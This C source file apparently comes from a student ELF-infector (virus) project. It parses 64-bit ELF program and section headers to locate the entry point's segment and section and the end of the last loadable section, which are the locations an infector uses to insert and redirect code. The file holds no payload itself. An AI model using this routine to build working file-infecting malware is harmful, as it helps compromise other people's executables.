/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   find_entry.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/10 23:43:29 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 12:09:54 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"
#include "utils.h"
#include "errors.h"

struct	data
{
	struct entry	*stored_entry;
	Elf64_Addr	e_entry;
};

static bool	find_entry_shdr(struct safe_pointer info, const struct endians_pointer endians,
	const size_t offset, void *data)
{
	struct data		*closure        = data;
	struct entry		*stored_entry   = closure->stored_entry;
	Elf64_Shdr		*elf64_sect_hdr = safe(offset, sizeof(Elf64_Shdr));

#ifdef DEBUG
	char			e[] = {'5','1','\0'};
#endif
	if (!elf64_sect_hdr) return errors(ERR_CORRUPT, e);

	const Elf64_Addr	sh_addr = endians.endian_8(elf64_sect_hdr->sh_addr);
	const Elf64_Xword	sh_size = endians.endian_8(elf64_sect_hdr->sh_size);

	if (sh_addr <= closure->e_entry && closure->e_entry < sh_addr + sh_size)
		stored_entry->safe_shdr = elf64_sect_hdr;

	const Elf64_Off		p_offset  = endians.endian_8(stored_entry->safe_phdr->p_offset);
	const Elf64_Off		sh_offset = endians.endian_8(elf64_sect_hdr->sh_offset);
	const Elf64_Xword	p_filesz  = endians.endian_8(stored_entry->safe_phdr->p_filesz);

	const size_t		end_of_ptload = p_offset + p_filesz;
	const size_t		end_of_sect   = sh_offset + sh_size;

	if (end_of_sect <= end_of_ptload
	&& (end_of_sect > stored_entry->end_of_last_section))
	{
		stored_entry->safe_last_section_shdr = elf64_sect_hdr;
		stored_entry->end_of_last_section = end_of_sect;
	}

	return true;
}

static bool	find_entry_phdr(struct safe_pointer info, const struct endians_pointer endians,
	const size_t offset, void *data)
{
	struct data		*closure       = data;
	struct entry		*stored_entry  = closure->stored_entry;
	Elf64_Phdr		*elf64_seg_hdr = safe(offset, sizeof(Elf64_Phdr));

#ifdef DEBUG
	char			e[] = {'5','2','\0'};
#endif

	if (!elf64_seg_hdr) return errors(ERR_CORRUPT, e);

	const Elf64_Addr	p_vaddr = endians.endian_8(elf64_seg_hdr->p_vaddr);
	const Elf64_Xword	p_memsz = endians.endian_8(elf64_seg_hdr->p_memsz);

	if (p_vaddr <= closure->e_entry && closure->e_entry < p_vaddr + p_memsz)
		stored_entry->safe_phdr = elf64_seg_hdr;
	return (true);
}

bool		find_entry(struct entry *original_entry, struct safe_pointer info,
	const struct endians_pointer endians)
{
	struct data	closure;
	Elf64_Ehdr	*safe_elf64_hdr;
#ifdef DEBUG
	char		e1[] = {'5','3','\0'};
	char		e2[] = {'5','4','\0'};
	char		e3[] = {'5','5','\0'};
	char		e4[] = {'5','6','\0'};
	char		e5[] = {'5','7','\0'};
#endif

	safe_elf64_hdr = safe(0, sizeof(Elf64_Ehdr));
	if (!safe_elf64_hdr) return errors(ERR_CORRUPT, e1);
	closure.e_entry = endians.endian_8(safe_elf64_hdr->e_entry);

	ft_bzero(original_entry, sizeof(*original_entry));
	closure.stored_entry = original_entry;

	if (!foreach_phdr(info, endians, find_entry_phdr, &closure))
		return errors(ERR_THROW, e2);
	if (!original_entry->safe_phdr)
		return errors(ERR_CORRUPT, e3);

	if (!foreach_shdr(info, endians, find_entry_shdr, &closure))
		return errors(ERR_THROW, e2);
	if (!original_entry->safe_shdr)
		return errors(ERR_CORRUPT, e4);

	const Elf64_Addr sh_addr  = endians.endian_8(original_entry->safe_shdr->sh_addr);

	original_entry->offset_in_section = closure.e_entry - sh_addr;

	if (original_entry->end_of_last_section == 0)
		return errors(ERR_CORRUPT, e5);

	return (true);
}
